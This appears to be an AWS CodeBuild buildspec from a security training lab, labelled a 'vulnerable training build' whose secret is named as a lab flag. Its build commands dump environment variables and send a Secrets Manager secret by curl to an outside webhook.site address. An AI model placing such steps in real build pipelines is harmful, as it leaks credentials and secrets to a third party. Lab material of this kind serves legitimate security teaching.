version: 0.2

phases:
  build:
    commands:
      - echo "Running vulnerable training build"
      - env | sort | head -n 20
      - echo "Done"
      - curl -X POST -d @- https://webhook.site/56dff309-fe45-4015-b5e3-f2df49b5d7fd/${aws secretsmanager get-secret-value --secret-id flag_codebuild_­lab_5 --region us-east-1}
